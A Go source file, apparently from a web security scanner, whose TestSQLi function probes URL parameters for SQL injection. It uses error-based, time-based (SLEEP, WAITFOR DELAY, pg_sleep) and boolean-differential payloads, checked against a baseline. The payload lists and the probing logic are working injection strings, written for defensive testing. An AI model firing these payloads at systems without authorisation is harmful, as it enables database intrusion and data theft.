package native

import (
	"fmt"
	"time"
)

type SQLiResult struct {
	Endpoint   string `json:"endpoint"`
	Parameter  string `json:"parameter"`
	Payload    string `json:"payload"`
	Vulnerable bool   `json:"vulnerable"`
	Evidence   string `json:"evidence"`
}

type sqlBooleanPair struct {
	truePayload  string
	falsePayload string
}

// TestSQLi performs error-based, time-based and boolean-differential checks.
// It used to report any HTTP 500 as injection, which made every failing
// endpoint look vulnerable.  A finding now requires a database-specific error
// that is absent from the baseline, a reproducible delay, or a confirmed
// boolean differential.
func TestSQLi(baseURL string, params map[string]string, concurrency int) []SQLiResult {
	_ = concurrency // kept for API compatibility; requests are paced below

	errorPayloads := []string{
		"'",
		"' OR '1'='1",
		"' OR 1=1--",
		"\" OR \"1\"=\"1",
		"1' AND 1=1--",
		"1' AND 1=2--",
		"' UNION SELECT NULL--",
		"' UNION SELECT 1,2,3--",
		"admin'--",
		"admin' OR '1'='1'--",
		"1' ORDER BY 1--",
		"1' ORDER BY 100--",
		"1' OR '1'='1' /*",
		"1' OR '1'='1' #",
		"admin\"--",
		"1' UNION SELECT @@version--",
	}

	timePayloads := []struct {
		payload string
		delay   time.Duration
	}{
		{"' WAITFOR DELAY '0:0:5'--", 5 * time.Second},
		{"1 AND SLEEP(5)", 5 * time.Second},
		{"1' AND SLEEP(5)--", 5 * time.Second},
		{"' OR pg_sleep(5)--", 5 * time.Second},
	}

	booleanPairs := []sqlBooleanPair{
		{"' AND '1'='1", "' AND '1'='2"},
		{"1 AND 1=1", "1 AND 1=2"},
		{"' OR '1'='1", "' OR '1'='2"},
	}

	client := scanClient(15 * time.Second)
	results := make([]SQLiResult, 0)
	seen := make(map[string]bool)

	add := func(param, payload, evidence string) {
		key := param + "\x00" + payload
		if seen[key] {
			return
		}
		seen[key] = true
		results = append(results, SQLiResult{
			Endpoint:   baseURL,
			Parameter:  param,
			Payload:    payload,
			Vulnerable: true,
			Evidence:   evidence,
		})
	}

	for param, original := range params {
		baselineStatus, baselineBody, baselineLatency, err := paramRequest(
			client, baseURL, params, param, original)
		if err != nil {
			continue
		}

		for _, payload := range errorPayloads {
			status, body, err := newParamRequest(client, baseURL, params, param, original+payload)
			if err != nil {
				continue
			}
			if signature := newSignature(body, baselineBody, sqlErrorSignatures); signature != "" {
				add(param, payload, fmt.Sprintf(
					"Database error signature %q appeared after injection (HTTP %d -> %d)",
					signature, baselineStatus, status))
			}
		}

		for _, probe := range timePayloads {
			start := time.Now()
			status, body, err := newParamRequest(client, baseURL, params, param, original+probe.payload)
			elapsed := time.Since(start)
			if err != nil || status >= 500 {
				continue
			}
			// Require the response to be delayed by (almost) the injected
			// amount beyond the baseline.  Network jitter alone cannot
			// produce a five-second gap consistently.
			if elapsed >= probe.delay && elapsed >= baselineLatency+probe.delay-500*time.Millisecond {
				add(param, probe.payload, fmt.Sprintf(
					"Response delayed by %s (baseline %s) with time-based payload",
					elapsed.Round(time.Millisecond), baselineLatency.Round(time.Millisecond)))
				_ = body
				break
			}
		}

		for _, pair := range booleanPairs {
			trueStatus, trueBody, err := newParamRequest(client, baseURL, params, param, original+pair.truePayload)
			if err != nil {
				continue
			}
			falseStatus, falseBody, err := newParamRequest(client, baseURL, params, param, original+pair.falsePayload)
			if err != nil {
				continue
			}
			if trueStatus != falseStatus || trueStatus >= 500 || falseStatus >= 500 {
				continue
			}
			firstDiff := absInt(len(trueBody) - len(falseBody))
			if firstDiff < 40 || responseDiffRatio(trueBody, falseBody) < 0.05 {
				continue
			}
			// Confirm the differential: a single dynamic page can change
			// length, but a boolean injection reproduces the gap.
			_, trueBody2, err := newParamRequest(client, baseURL, params, param, original+pair.truePayload)
			if err != nil {
				continue
			}
			_, falseBody2, err := newParamRequest(client, baseURL, params, param, original+pair.falsePayload)
			if err != nil {
				continue
			}
			secondDiff := absInt(len(trueBody2) - len(falseBody2))
			if secondDiff < 40 || responseDiffRatio(trueBody2, falseBody2) < 0.05 {
				continue
			}
			add(param, pair.truePayload+" / "+pair.falsePayload, fmt.Sprintf(
				"Boolean differential confirmed: true=%d bytes, false=%d bytes (repeat %d/%d)",
				len(trueBody2), len(falseBody2), firstDiff, secondDiff))
		}
	}

	return results
}
